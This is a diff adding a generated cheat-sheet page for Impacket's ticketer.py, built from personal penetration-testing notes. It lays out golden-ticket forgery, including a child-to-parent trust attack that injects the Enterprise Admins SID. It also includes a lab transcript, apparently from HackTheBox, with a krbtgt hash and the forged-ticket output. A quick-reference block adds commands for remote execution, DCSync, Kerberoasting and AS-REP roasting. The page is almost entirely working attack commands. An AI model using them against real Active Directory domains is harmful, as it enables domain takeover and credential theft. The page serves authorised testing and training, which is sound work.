@@ -1,0 +1,86 @@
+---
+title: "ticketer.py"
+sidebarTitle: "ticketer.py"
+description: "Commands and examples collected from your ticketer.py notes."
+keywords: ["ticketer.py", "impacket-ticketer"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/ticketer.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=ticketer) · [All tools](/index)
+
+## Cross-domain / cross-forest
+
+**Notebook example**
+
+```bash
+# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
+ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
+# intra-forest trust key abuse
+lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="Constructing a Golden Ticket using ticketer.py">
+
+### Constructing a Golden Ticket using ticketer.py
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in hacker.ccache
+```
+
+</Accordion>
+
+<Accordion title="Original captured examples">
+
+### Original captured examples
+
+**Impacket: Script Quick Reference**
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+</Accordion>
+
+</AccordionGroup>
